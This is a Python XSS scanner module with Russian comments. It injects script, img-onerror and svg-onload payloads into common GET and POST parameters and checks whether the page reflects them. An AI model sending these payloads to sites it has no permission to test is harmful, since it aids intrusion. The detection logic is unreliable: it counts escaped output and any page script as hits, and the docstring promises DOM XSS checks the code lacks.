"""
XSS Scanner: Reflected & DOM XSS в параметрах q, search, input, data, cat, searchFor и др.
Проверяет GET, POST, фрагмент URL (для DOM XSS - заголовок Referer/источник).
"""
import requests
from urllib.parse import urlencode, urlparse, parse_qs
import html

# Приоритетные payloads (наиболее эффективные первые)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    '"/><script>alert(1)</script>',
    "1\"><img src=x onerror=alert(1)>",  # для числовых параметров (cat, id)
]

# Опасные подстроки для детекции частичного отражения
XSS_SIGNATURES = ["<script>", "onerror=", "onload=", "alert(1)", "javascript:"]

# Параметры для проверки (включая testphp.vulnweb.com: cat, searchFor)
PARAMS = [
    "q", "query", "search", "s", "searchFor", "keyword", "term",
    "input", "data", "test", "id", "cat", "name", "value", "url",
    "artist", "ref", "return", "redirect", "callback",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Accept": "text/html,application/xhtml+xml",
}


def _params_from_url(url: str) -> list:
    """Извлечь имена параметров из URL."""
    try:
        parsed = urlparse(url)
        if parsed.query:
            return list(parse_qs(parsed.query, keep_blank_values=True).keys())
    except Exception:
        pass
    return []


def _build_url(base_url: str, param: str, payload: str) -> str:
    """Построить URL с param=payload, учитывая существующие query-параметры."""
    parsed = urlparse(base_url)
    base = f"{parsed.scheme or 'http'}://{parsed.netloc or ''}{parsed.path or '/'}"
    existing = parse_qs(parsed.query, keep_blank_values=True) if parsed.query else {}
    existing[param] = [payload]
    query = urlencode({k: v[0] for k, v in existing.items()})
    return f"{base}?{query}"


def _is_reflected(payload: str, text: str) -> bool:
    """Проверка отражения: полное, escaped или частичное."""
    if not text:
        return False
    if payload in text:
        return True
    if html.escape(payload) in text:
        return True
    for sig in XSS_SIGNATURES:
        if sig in text and any(p in payload for p in ("script", "onerror", "onload", "alert", "javascript")):
            return True
    return False


def scan_xss_basic(url: str, timeout: int = 5, max_payloads: int = 6) -> list:
    """Сканирование на reflected XSS. Early exit при первой находке."""
    url_params = _params_from_url(url)
    params = list(dict.fromkeys(url_params + [p for p in PARAMS if p not in url_params]))[:15]
    payloads = XSS_PAYLOADS[:max_payloads]
    results = []

    for param in params:
        for payload in payloads:
            try:
                test_url = _build_url(url, param, payload)
                resp = requests.get(test_url, headers=HEADERS, timeout=timeout, allow_redirects=True)
                if _is_reflected(payload, resp.text):
                    results.append({
                        "param": param,
                        "payload": payload[:50] + ("..." if len(payload) > 50 else ""),
                        "url": test_url,
                        "vector": "GET",
                        "suspicious": True,
                    })
                    return results  # Early exit

                if param in ("q", "search", "searchFor", "input", "data", "query", "keyword"):
                    base = url.split("?")[0] or url
                    resp_post = requests.post(
                        base, data={param: payload}, headers=HEADERS,
                        timeout=timeout, allow_redirects=True
                    )
                    if _is_reflected(payload, resp_post.text):
                        results.append({
                            "param": param,
                            "payload": payload[:50] + ("..." if len(payload) > 50 else ""),
                            "url": test_url,
                            "vector": "POST",
                            "suspicious": True,
                        })
                        return results
            except requests.RequestException:
                continue
    return results


def scan_xss(url: str) -> bool:
    """WebSecAI: True если найдена XSS уязвимость."""
    print(f"🔍 XSS scan: {url}")
    try:
        results = scan_xss_basic(url)
        if results:
            print(f"🟡 XSS found: {len(results)} vector(s)!")
            for r in results[:3]:
                print(f"  → {r['param']} ({r.get('vector', 'GET')}): {r['payload']}")
            return True
        print("🟢 XSS clean")
        return False
    except Exception as e:
        print(f"  ⚠️ XSS scan error: {e}")
        return False
